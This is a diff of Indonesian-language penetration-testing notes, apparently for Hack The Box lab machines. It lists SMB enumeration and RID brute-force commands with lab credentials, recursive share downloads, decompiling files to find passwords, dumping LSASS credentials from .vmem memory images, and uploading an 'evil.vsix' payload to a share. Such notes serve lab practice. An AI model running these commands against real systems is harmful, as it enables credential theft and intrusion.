@@ -10,12 +10,13 @@ nxc smb 10.129.244.81 -u '' -p ''
 smbmap -H 10.129.244.81 -u Guest -p ''
 ```
 
-# Login
+# Authenticated Session
 ```shell
 nxc smb darkcorp.htb -u 'victor.r' -p 'victor1gustavo@#' --shares 
 ```
 
-# Explore
+# Explore 
+## Shares
 cari sensitif file yang extensionnnya .config atau exe, cari terbuat dari apa lalu decompile file tersebut, grep password, kalau dapat credential gas login smb dengan creds itu
 
 kalau SYSVOL dan NETLOGON pada SMB, dipastikan mesin tersebut adalah Domain Controller, cek share itu dulu.
@@ -43,18 +44,21 @@ smbmap -H 10.129.245.130 -u wallace.everette -p Welcome2026@ --download './Logs/
 smbmap -H 10.129.245.130 -u 'wallace.everette' -p 'Welcome2026@' -r -A '.*'
 ```
 
-# List User
+### VMBackups
+- Cek `.vmem` 
+  karena itu RAM dump — tempat LSASS hidup dan menyimpan credential. Gunakan `vol` (Kalau filenya kecil) untuk di luar shell windows atau gunakan `vmkatz` (jika file terlalu besar untuk di download) untuk di dalam shell
+### WSUS
+### Logs
+
+## List User
 ```shell
 # jika nama ada akhiran $, berarti itu adalah computer account  
 nxc smb 10.129.245.130 -u 'wallace.everette' -p 'Welcome2026@' --rid-brute | tee listuser.txt
 ```
 
-# Upload
+## Upload
 ```shell
 smbclient //10.129.28.66/DevDrop -U 'checkpoint.htb/Mark.Davies%Checkpoint2024!' -c "put evil.vsix evil.vsix"
 ```
 
-# Shares
-## 1. VMBackups
-- Cek `.vmem` 
-  karena itu RAM dump — tempat LSASS hidup dan menyimpan credential. Gunakan `vol` (Kalau filenya kecil) untuk di luar shell windows atau gunakan `vmkatz` (jika file terlalu besar untuk di download) untuk di dalam shell
+
